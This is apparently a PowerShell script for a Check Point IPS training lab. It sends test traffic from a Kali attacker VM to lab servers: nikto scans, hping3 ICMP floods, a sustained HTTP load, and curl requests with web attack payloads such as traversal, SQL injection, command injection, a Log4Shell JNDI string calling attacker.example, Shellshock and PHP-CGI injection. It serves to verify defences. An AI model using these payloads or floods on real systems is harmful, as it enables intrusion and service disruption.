<#
.SYNOPSIS
    Camino Lab Start - Threat Prevention test traffic for the CTPS labs.
.DESCRIPTION
    Runs on A-GUI (Lab Start Extras). Uses only the course's own test files, pages and attack steps.
      -Test Malware : from A-GUI, fetches the EICAR file, the wicar test page, the Anti-Bot test page,
                      cpcheckme and the threat-cloud bot test pages, and reports Blocked / Allowed / No answer.
      -Test Attacks : on the Attacker (Kali) through RDP-HOST: nikto against A-DMZ-NAT (time-limited) and
                      large ICMP packets (hping3 -d 2200 and -d 5000), as in Labs 2A, 6A and 7A.
      -Test Flood   : on the Attacker, the Lab 10A penalty box commands: an ICMP flood at the gateway for
                      -Seconds (hping3 --flood), then nikto against A-DMZ-NAT to test the penalty box.
      -Test Load    : on the Attacker, a sustained HTTP load against A-DMZ-NAT for -HttpMinutes
                      (openload-style, runs in the background on Kali). Stop it with -Test LoadStop.
      -Test LoadStop: stops the background HTTP load started by -Test Load.
      -Test Curl    : the curl IPS exercise adapted to CTPS: a normal request, a directory traversal and an
                      SQL injection test request to the DMZ web server, then the matching IPS logs read on
                      A-SMS (mgmt_cli show-logs over SSH; admin's shell must be bash) and shown here.
                      -From Attacker (default): sent from Kali through RDP-HOST to A-DMZ-NAT (from the internet).
                      -From AGUI: sent from A-GUI to A-DMZ (internal), when Kali has no SSH.
    -Repeat N runs the chosen test N times with a pause between, so logs keep arriving during a demo.
    Kali needs SSH on (once, on Kali: sudo systemctl enable --now ssh).
    Windows PowerShell 5.1, ASCII only.
#>
[CmdletBinding()]
param(
    [ValidateSet('Malware', 'Attacks', 'Flood', 'Load', 'LoadStop', 'Curl')][string]$Test = 'Malware',
    [ValidateSet('Attacker', 'AGUI')][string]$From = 'Attacker',
    [switch]$Advanced,
    [string]$DmzInternal = '192.168.12.101',   # A-DMZ
    [string]$Sms = '10.1.1.101',
    [int]$LogWaitSeconds = 240,     # suppressed repeats can take a few minutes to update the first log
    [int]$Repeat = 1,
    [int]$PauseSeconds = 30,
    [int]$Seconds = 20,
    [string]$Target   = '203.0.113.121',   # A-DMZ-NAT
    [string]$GwTarget = '203.0.113.1',     # A-GW external
    [string]$HttpTarget = '203.0.113.121', # A-DMZ-NAT (web server) for the HTTP load
    [int]$HttpMinutes = 15,                # how long the background HTTP load runs
    [int]$HttpConcurrency = 8,             # concurrent HTTP requests in the load loop
    [string]$Attacker = '198.51.100.201',
    [string]$KaliUser = 'kali',
    [string]$KaliPassword = 'kali',
    [string]$RdpHost  = '10.1.1.230',
    [string]$Password = 'Chkp!234'
)

$ErrorActionPreference = 'Stop'
$env:PSModulePath = "$env:SystemRoot\system32\WindowsPowerShell\v1.0\Modules;$env:ProgramFiles\WindowsPowerShell\Modules"
$curl = "$env:SystemRoot\System32\curl.exe"

function Say([string]$Text, [string]$Colour = 'Cyan') { Write-Host $Text -ForegroundColor $Colour }

$MalwareUrls = [ordered]@{
    'Anti-Virus  EICAR (http)'          = 'http://www.eicar.org/download/eicar_com.zip'
    'Anti-Virus  wicar test page'       = 'https://www.wicar.org/test-malware.html'
    'Anti-Bot    test page'             = 'http://sc1.checkpoint.com/za/images/threatwiki/pages/TestAntiBotBlade.html'
    'Anti-Bot    cpcheckme'             = 'http://cpcheckme.com/checkme'
    'Anti-Bot    low confidence'        = 'https://www.threat-cloud.com/test/files/LowConfidenceBot.html'
    'Anti-Bot    medium confidence'     = 'http://www.threat-cloud.com/test/files/MediumConfidenceBot.html'
    'Anti-Bot    high confidence'       = 'http://www.threat-cloud.com/test/files/HighConfidenceBot.html'
}

function Invoke-MalwareTest {
    # A block shows as a redirect to the gateway's UserCheck portal (http), or as a dropped connection (https without inspection)
    $tmp = Join-Path $env:TEMP 'ctps-test.bin'
    foreach ($k in $MalwareUrls.Keys) {
        $u = $MalwareUrls[$k]
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        $r = & $curl -k -s -m 20 -o $tmp -w '%{http_code}|%{size_download}|%{redirect_url}' $u 2>$null
        $code, $size, $redir = "$r" -split '\|', 3
        $body = ''; try { $body = [IO.File]::ReadAllText($tmp) } catch {}
        if ($redir -match '/UserCheck/' -or $body -match '<title>\s*Check Point UserCheck') { $res = "Blocked - UserCheck page"; $col = 'Green' }
        elseif ($code -eq '000' -or -not $code) { $res = 'No connection (dropped by the gateway, or the name does not resolve)'; $col = 'Yellow' }
        elseif ($body -match 'X5O!P%@AP' -or $body.StartsWith('PK')) { $res = "Allowed - test file downloaded ($size bytes)"; $col = 'Red' }
        elseif ($code -match '^3') { $res = "Redirected (HTTP $code to $redir)"; $col = 'Yellow' }
        else { $res = "Allowed (HTTP $code, $size bytes)"; $col = 'Red' }
        Say ("  {0,-32} {1}" -f $k, $res) $col
    }
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
}

# Runs a bash script on the Attacker through RDP-HOST (A-GUI cannot reach the Attacker directly)
function Invoke-OnAttacker([string]$Script, [int]$TimeoutSec = 300) {
    $rc = New-Object System.Management.Automation.PSCredential ('Admin', (ConvertTo-SecureString $Password -AsPlainText -Force))
    Invoke-Command -ComputerName $RdpHost -Credential $rc -ErrorAction Stop -ArgumentList ($Script -replace "`r", ''), $Attacker, $KaliUser, $KaliPassword, $TimeoutSec -ScriptBlock {
        param([string]$Sh, [string]$Ip, [string]$U, [string]$P, [int]$T)
        $pl = 'C:\Program Files\PuTTY\plink.exe'
        if (-not (Test-Path $pl)) { throw 'plink.exe not found on RDP-HOST' }
        $tcp = New-Object Net.Sockets.TcpClient
        $up = $false; try { $up = $tcp.ConnectAsync($Ip, 22).Wait(3000) -and $tcp.Connected } catch {}; $tcp.Close()
        if (-not $up) { throw "The Attacker ($Ip) does not answer on SSH. On Kali run once: sudo systemctl enable --now ssh" }
        $null = "y`n" | & $pl -ssh -l $U -pw $P $Ip exit 2>&1      # accept the host key the first time
        $f = [IO.Path]::GetTempFileName(); [IO.File]::WriteAllText($f, $Sh)
        $psi = New-Object Diagnostics.ProcessStartInfo $pl, "-batch -l $U -pw `"$P`" $Ip -m `"$f`""
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true; $psi.CreateNoWindow = $true
        $proc = [Diagnostics.Process]::Start($psi)
        $o = $proc.StandardOutput.ReadToEndAsync(); $e = $proc.StandardError.ReadToEndAsync()
        if (-not $proc.WaitForExit($T * 1000)) { try { $proc.Kill() } catch {} }
        Remove-Item $f -Force -ErrorAction SilentlyContinue
        (($o.Result + "`n" + $e.Result) -split "`r?`n") | Where-Object { $_ -and $_ -notmatch 'authorized use|End of banner|Using username|Pre-authentication' }
    }
}

function Invoke-AttackTest {
    $sh = @"
P='$KaliPassword'
echo '== nikto against $Target (http, up to 90 s)'
timeout 100 nikto -C all -nossl -maxtime 90s -h $Target 2>&1 | grep -E '^\+ (Target|Start|End|[0-9]+ requests|.*error)' | head -12
echo '== hping3 ICMP 2200-byte packets x5 to $Target'
echo "`$P" | sudo -S -p '' hping3 -1 -c 5 -d 2200 $Target 2>&1 | tail -3
echo '== hping3 ICMP 5000-byte packets x5 to $Target'
echo "`$P" | sudo -S -p '' hping3 -1 -c 5 -d 5000 $Target 2>&1 | tail -3
"@
    Invoke-OnAttacker $sh 240 | ForEach-Object { Say "  $_" 'Gray' }
}

# Tag put in the HTTP load's processes so it can be found and stopped (curl -A and the bash arg $0)
$script:LoadTag = 'LabStartHttpLoad'

# Lab 10A penalty box commands, unchanged: ICMP flood at the gateway, then nikto against A-DMZ-NAT.
function Invoke-FloodTest {
    $sh = @"
P='$KaliPassword'
echo '== hping3 ICMP flood (500-byte) at $GwTarget for $Seconds s   (Lab 10A)'
echo "`$P" | sudo -S -p '' timeout -s INT $Seconds hping3 --flood -1 -d 500 $GwTarget 2>&1 | tail -4
echo '== nikto against $Target to test the penalty box   (Lab 10A)'
timeout 100 nikto -C all -nossl -maxtime 90s -h $Target 2>&1 | grep -E '^\+ (Target|Start|End|[0-9]+ requests|host|.*error)' | head -12
"@
    Invoke-OnAttacker $sh ($Seconds + 160) | ForEach-Object { Say "  $_" 'Gray' }
}

# Separate, openload-style sustained HTTP load on A-DMZ-NAT. Detached on Kali so it keeps running after the
# SSH session returns; a loop of concurrent HTTP GETs for -HttpMinutes. Tagged so -Test LoadStop can kill it.
function Invoke-HttpLoad {
    $secs = [int]$HttpMinutes * 60
    $load = @"
pkill -f $($script:LoadTag) 2>/dev/null
nohup setsid bash -c 'end=`$(( `$(date +%s) + $secs )); while [ `$(date +%s) -lt `$end ]; do for i in `$(seq 1 $HttpConcurrency); do curl -s -o /dev/null --max-time 5 -A $($script:LoadTag) http://$HttpTarget/ & done; wait; done' $($script:LoadTag) >/tmp/labstart_httpload.log 2>&1 &
echo 'HTTP load started on $HttpTarget for $HttpMinutes min (concurrency $HttpConcurrency)'
"@
    Say "  Starting a $HttpMinutes-minute HTTP load on A-DMZ-NAT ($HttpTarget)..." 'Cyan'
    Invoke-OnAttacker $load 60 | ForEach-Object { Say "  $_" 'Gray' }
    Say "  It runs in the background for about $HttpMinutes minutes." 'Yellow'
    Say "  Stop it early from Lab Start Extras (TP test - stop HTTP load), or on Kali: pkill -f $($script:LoadTag)" 'Yellow'
}

function Invoke-LoadStop {
    $sh = "pkill -f LabStartHttpLoad 2>/dev/null; echo 'HTTP load stopped (if it was running).'"
    Invoke-OnAttacker $sh 60 | ForEach-Object { Say "  $_" 'Gray' }
}

# --- Curl IPS exercise ------------------------------------------------------------------------------
# Each step: Id, Name, Expect, Path (after the host), and optional Raw (--path-as-is), Ua (User-Agent), Post (body).
# The payloads only trip the IPS signature on the request pattern; they do nothing on the IIS server itself.
$CurlBasic = @(
    @{ Id = 'normal';    Name = 'Normal request (should be allowed)';      Path = '/';                                      Expect = 'Allowed' }
    @{ Id = 'traversal'; Name = 'Directory traversal (../ to win.ini)';    Path = '/../../../../windows/win.ini';           Raw = $true;  Expect = 'Prevented' }
    @{ Id = 'sqli';      Name = "SQL injection test (id=1' OR '1'='1)";    Path = '/?id=1%27%20OR%20%271%27%3D%271';         Expect = 'Prevented' }
)
# Extra well-known test patterns (from the extended curl list). Single-quoted so PowerShell leaves them alone.
$CurlAdvanced = @(
    @{ Id = 'phpcgi';    Name = 'PHP-CGI arg injection (CVE-2024-4577)';   Path = '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'; Post = '<?php echo 1; ?>'; Expect = 'Prevented' }
    # IIS rejects this one itself (HTTP 400); no IPS protection fires on this lab's policy
    @{ Id = 'phpfpm';    Name = 'PHP-FPM / nginx (CVE-2019-11043)';        Path = '/index.php/PHP%0Ais.php?a=1';            Expect = 'Reached the server' }
    @{ Id = 'phpwrap';   Name = 'PHP wrapper file read (php://filter)';    Path = '/?page=php://filter/convert.base64-encode/resource=index.php'; Expect = 'Prevented' }
    @{ Id = 'lintrav';   Name = 'Linux traversal (/etc/passwd)';           Path = '/?file=../../../../etc/passwd';          Expect = 'Prevented' }
    @{ Id = 'cmdinj';    Name = 'Command injection (;cat /etc/passwd)';    Path = '/ping.php?ip=127.0.0.1;cat%20/etc/passwd'; Expect = 'Prevented' }
    @{ Id = 'log4shell'; Name = 'Log4Shell in User-Agent (CVE-2021-44228)'; Path = '/'; Ua = '${jndi:ldap://attacker.example/a}'; Expect = 'Prevented' }
    @{ Id = 'spring4';   Name = 'Spring4Shell (CVE-2022-22965)';           Path = '/?class.module.classLoader.URLs%5B0%5D=0'; Expect = 'Prevented' }
    @{ Id = 'shellshk';  Name = 'Shellshock in User-Agent (CVE-2014-6271)'; Path = '/cgi-bin/test.cgi'; Ua = '() { :; }; echo; /bin/id'; Expect = 'Prevented' }
    @{ Id = 'xss';       Name = 'XSS (<script>alert(1)</script>)';         Path = '/?q=%3Cscript%3Ealert(1)%3C/script%3E'; Expect = 'Prevented' }
    @{ Id = 'scanua';    Name = 'Scanner User-Agent (sqlmap)';             Path = '/'; Ua = 'sqlmap/1.8'; Expect = 'Prevented' }
)
$CurlSteps = if ($Advanced) { $CurlBasic + $CurlAdvanced } else { $CurlBasic }

function Get-CurlVerdict([string]$Code, [string]$Rc) {
    if ($Rc -in '52', '56', '35') { return 'Prevented' }                    # connection reset by the gateway
    if ($Rc -in '7', '28') { return 'No connection (policy drop, or server down)' }
    if ($Code -match '^(000)?$') { return "No answer (curl exit $Rc)" }
    if ($Code -match '^2') { return 'Allowed' }
    return "Reached the server (HTTP $Code)"
}

function Invoke-CurlRequests {
    # Returns one object per step: Id, Name, Expect, Code, Rc
    if ($From -eq 'AGUI') {
        $base = "http://$DmzInternal"
        foreach ($s in $CurlSteps) {
            $a = @('-s', '-o', 'NUL', '-m', '10', '-w', '%{http_code}')
            if ($s.Raw) { $a += '--path-as-is' }
            if ($s.Ua) { $a += @('-A', $s.Ua) }
            if ($s.Post) { $a += @('-X', 'POST', '-d', $s.Post) }
            $code = & $curl @a ($base + $s.Path) 2>$null
            [pscustomobject]@{ Id = $s.Id; Name = $s.Name; Expect = $s.Expect; Code = "$code"; Rc = "$LASTEXITCODE" }
            Start-Sleep -Seconds 2
        }
        return
    }
    $lines = foreach ($s in $CurlSteps) {
        # payloads hold no single quotes, so wrapping them in '...' keeps bash from expanding them
        $opt = ''
        if ($s.Raw) { $opt += '--path-as-is ' }
        if ($s.Ua) { $opt += "-A '$($s.Ua)' " }
        if ($s.Post) { $opt += "-X POST -d '$($s.Post)' " }
        # rc=$? straight after the assignment is curl's exit status
        "c=`$(curl -s -o /dev/null -m 10 -w '%{http_code}' $opt'http://$Target$($s.Path)'); rc=`$?; echo `"STEP|$($s.Id)|`$c|`$rc`"; sleep 2"
    }
    $out = Invoke-OnAttacker ($lines -join "`n") 120
    foreach ($s in $CurlSteps) {
        $l = $out | Where-Object { $_ -like "STEP|$($s.Id)|*" } | Select-Object -First 1
        $p = "$l" -split '\|'
        [pscustomobject]@{ Id = $s.Id; Name = $s.Name; Expect = $s.Expect; Code = $p[2]; Rc = $p[3] }
    }
}

function Invoke-SmsPlink([string]$Command, [int]$TimeoutSec = 60) {
    # Runs one command on A-SMS as admin over SSH (plink), like the Gaia commands tab. Returns the output text.
    $pl = 'C:\Program Files\PuTTY\plink.exe'
    if (-not (Test-Path $pl)) { throw "plink.exe not found at $pl" }
    $base = "-ssh -l admin -pw `"$Password`" $Sms"
    $null = "y`n" | & $pl -ssh -l admin -pw $Password $Sms exit 2>&1   # accept the host key the first time
    $f = [IO.Path]::GetTempFileName(); [IO.File]::WriteAllText($f, $Command)
    try {
        $psi = New-Object Diagnostics.ProcessStartInfo $pl, "-batch $base -m `"$f`""
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true; $psi.CreateNoWindow = $true
        $p = [Diagnostics.Process]::Start($psi); $o = $p.StandardOutput.ReadToEndAsync(); $e = $p.StandardError.ReadToEndAsync()
        if (-not $p.WaitForExit($TimeoutSec * 1000)) { try { $p.Kill() } catch {} }
        return $o.Result
    } finally { Remove-Item $f -Force -ErrorAction SilentlyContinue }
}

function Assert-SmsBash {
    if ((Invoke-SmsPlink 'echo LSMARK_$((6*7))' 30) -notmatch 'LSMARK_42') {
        throw "A-SMS answers SSH in clish, so mgmt_cli cannot run. Set admin's shell to bash on A-SMS (Lab Start, Gaia commands tab: 'set user admin shell /bin/bash'), or check the logs in SmartConsole"
    }
}

function Get-IpsLogQuery([string]$SrcIp) {
    # last-7-days, not last-hour: a repeated attack raises the counter on its FIRST log, which keeps the
    # time of the first attack (possibly days ago)
    "mgmt_cli -r true show-logs new-query.filter 'blade:IPS AND src:$SrcIp' new-query.time-frame last-7-days new-query.max-logs-per-request 100 --format json"
}

function Read-IpsLogSet([string]$Json) {
    # Parse one mgmt_cli show-logs JSON blob into log objects (robust to leading banner text)
    $i = $Json.IndexOf('{')
    if ($i -lt 0) { throw "mgmt_cli gave no JSON: $($Json.Trim())" }
    $r = $Json.Substring($i) | ConvertFrom-Json
    if ($r.code) { throw "mgmt_cli: $($r.message)" }
    # Emit the log objects one by one; callers collect them with @(...)
    foreach ($l in @($r.logs)) { if ($l) { $l } }
}

function Get-LogKey($l) {
    # The log 'id' changes between queries (made by the indexer), so identify a log by what it says
    "$($l.time)|$($l.protection_name)|$($l.src)|$($l.action)|$(@($l.resource)[0])"
}

function Get-LogHits($l) {
    # IPS log suppression: a repeat of the same attack (source, destination, protection) does not make a
    # new log; it raises 'suppressed_logs' on the first one. So each log counts as that many hits.
    $s = 0; [void][int]::TryParse("$($l.suppressed_logs)", [ref]$s); [Math]::Max(1, $s)
}

function Get-IpsBaseline([string]$SrcIp) {
    # Hits per log before the test (key -> hits), so afterwards we show only new logs and new repeats
    $logs = Read-IpsLogSet (Invoke-SmsPlink (Get-IpsLogQuery $SrcIp) 90)
    $h = @{}
    foreach ($l in $logs) { $h[(Get-LogKey $l)] = Get-LogHits $l }
    return $h
}

function Wait-IpsLogs([string]$SrcIp, [int]$BaselineCount, [int]$Want) {
    # One SSH call: A-SMS polls its own logs until there are Want new hits (or the time runs out).
    # BaselineCount = hits before the test; a hit is a new log or a raised suppressed_logs counter.
    $q = Get-IpsLogQuery $SrcIp
    $target = $BaselineCount + $Want
    $tries = [Math]::Max(3, [int]($LogWaitSeconds / 8))
    # Stops when all expected hits are in, or when hits have arrived and the total has not changed
    # for 3 polls (so a request that is never logged does not keep it waiting to the end).
    $loop = @"
P=-1; S=0
for i in `$(seq 1 $tries); do
  J=`$($q)
  C=`$(echo "`$J" | python3 -c 'import sys,json; print(sum(max(1,int(l.get("suppressed_logs") or 1)) for l in json.load(sys.stdin).get("logs",[])))' 2>/dev/null)
  C=`${C:-0}
  echo "LSPOLL `$C"
  [ "`$C" -ge $target ] && break
  if [ "`$C" -gt $BaselineCount ] && [ "`$C" -eq "`$P" ]; then S=`$((S+1)); else S=0; fi
  [ "`$S" -ge 3 ] && break
  P=`$C
  sleep 8
done
echo LSJSON
echo "`$J"
"@
    $out = Invoke-SmsPlink $loop ($tries * 14 + 30)
    foreach ($m in [regex]::Matches($out, 'LSPOLL (\d+)')) { Write-Host ("  ... {0} new IPS hit(s) on A-SMS" -f ([int]$m.Groups[1].Value - $BaselineCount)) -ForegroundColor DarkGray }
    $json = ($out -split 'LSJSON', 2)[-1]
    Read-IpsLogSet $json
}

function Format-LogTime($t) {
    if ($t -is [datetime]) { return $t.ToString('HH:mm:ss') }
    if ("$t" -match 'T(\d\d:\d\d:\d\d)') { return "$($matches[1]) UTC" }
    "$t"
}

function Invoke-CurlTest {
    $src = if ($From -eq 'AGUI') { '10.1.1.201' } else { $Attacker }
    $dst = if ($From -eq 'AGUI') { "A-DMZ $DmzInternal" } else { "A-DMZ-NAT $Target" }
    Say "  From $From ($src) to $dst over http" 'White'

    # Read the logs on A-SMS over SSH (the lab Management API is 'Require local', so it refuses A-GUI).
    # Note the hits that already exist, so afterwards we show only the new events.
    $readLogs = $true; $before = @{}
    try { Assert-SmsBash; $before = Get-IpsBaseline $src }
    catch { Say "  (Log read-back off: $($_.Exception.Message))" 'DarkYellow'; $readLogs = $false }

    $results = @(Invoke-CurlRequests)
    foreach ($r in $results) {
        if (-not $r.Code -and -not $r.Rc) { Say ("  {0,-44} no result (did the request run?)" -f $r.Name) 'Yellow'; continue }
        $v = Get-CurlVerdict $r.Code $r.Rc
        $col = if ($v -like "$($r.Expect)*") { 'Green' } else { 'Red' }
        Say ("  {0,-44} {1}  (HTTP {2}, curl exit {3})" -f $r.Name, $v, ($(if ($r.Code) { $r.Code } else { '000' })), $r.Rc) $col
    }

    if ($readLogs) {
        Say ''
        Say '  Reading the new IPS logs from A-SMS (they take up to a minute to arrive)...' 'Cyan'
        $want = @($results | Where-Object { (Get-CurlVerdict $_.Code $_.Rc) -eq 'Prevented' }).Count
        try {
            $baseHits = 0; foreach ($v in $before.Values) { $baseHits += $v }
            $all = @(Wait-IpsLogs $src $baseHits $want)
            # A log is shown if it is new, or if its suppressed_logs counter rose (a repeat of an earlier attack)
            $changed = @($all | Where-Object { $k = Get-LogKey $_; (-not $before.ContainsKey($k)) -or ((Get-LogHits $_) -gt $before[$k]) } | Sort-Object { "$($_.time)" })
            if (-not $changed) { Say "  No new IPS hits from $src yet - check SmartConsole: Logs & Events, filter  blade:IPS" 'Yellow' }
            $repeats = 0
            foreach ($l in $changed) {
                $k = Get-LogKey $l
                if ($before.ContainsKey($k)) { $repeats++; $tag = "repeat - log from $(Format-LogTime $l.time), now $(Get-LogHits $l) hits" }
                else { $tag = "new log $(Format-LogTime $l.time)" }
                Say ("  {0,-8} {1,-50} {2}" -f $l.action, $l.protection_name, "$($l.severity)/$($l.confidence_level)") 'Green'
                Say ("           {0}" -f $tag) 'Gray'
            }
            if ($repeats) {
                Say '  Repeats do not make a new log line: IPS log suppression adds them to the first log of the same attack' 'DarkYellow'
                Say '  (same source, destination and protection). In SmartConsole, open that log and look at Suppressed Logs.' 'DarkYellow'
            }
        } catch { Say "  Could not read the logs from $Sms ($($_.Exception.Message)). Check SmartConsole: Logs & Events, filter  blade:IPS" 'Yellow' }
    }
    Say ''
    Say '  In SmartConsole: Logs & Events, filter  blade:IPS  (or  product_family:Threat  - lower case p).' 'Cyan'
    Say '  Question: why is the request prevented when the Access Control policy allows http to the web server?' 'Cyan'
}

Say ''
Say "Camino Lab Start - CTPS test traffic: $Test" 'White'
Say ('-' * 60) 'DarkGray'
for ($i = 1; $i -le [Math]::Max(1, $Repeat); $i++) {
    if ($Repeat -gt 1) { Say "Round $i of $Repeat - $(Get-Date -Format 'HH:mm:ss')" 'White' }
    try {
        switch ($Test) {
            'Malware' { Invoke-MalwareTest }
            'Attacks' { Invoke-AttackTest }
            'Flood'    { Invoke-FloodTest }
            'Load'     { Invoke-HttpLoad }
            'LoadStop' { Invoke-LoadStop }
            'Curl'     { Invoke-CurlTest }
        }
    } catch { Say "  Failed: $($_.Exception.Message)" 'Red' }
    if ($i -lt $Repeat) { Start-Sleep -Seconds $PauseSeconds }
}
Say ''
Say 'Done. See the results in SmartConsole: Logs & Events (Threat Prevention), or in Web SmartConsole.' 'Green'
